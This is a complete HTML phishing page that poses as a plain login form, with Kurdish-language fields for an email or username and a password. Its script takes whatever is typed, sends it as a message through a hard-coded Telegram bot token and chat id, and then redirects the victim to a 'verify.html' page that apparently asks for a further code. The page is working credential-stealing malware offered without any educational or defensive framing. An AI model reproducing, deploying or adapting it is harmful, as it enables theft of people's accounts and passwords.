<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 320px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <h2>Login</h2>
    <form id="step1">
        <input type="text" id="user" placeholder="ئیمێل یان ناڤێ بکارهێنەری" required>
        <input type="password" id="pass" placeholder="پاسۆرد" required>
        <button type="submit">دواتر (Next)</button>
    </form>
</div>

<script>
    document.getElementById('step1').addEventListener('submit', function(e) {
        e.preventDefault();
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        
        const token = "8752727438:AAFJP2gw18UHVfBW_fef7J1rOuQJ3WVhoNU";
        const chat_id = "6648131751";
        const msg = `📧 Email: ${user}\n🔑 Pass: ${pass}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
        .then(() => {
            // رەوانەکردن بۆ لاپەڕێ کۆدی
            window.location.href = "verify.html";
        });
    });
</script>
</body>
</html>
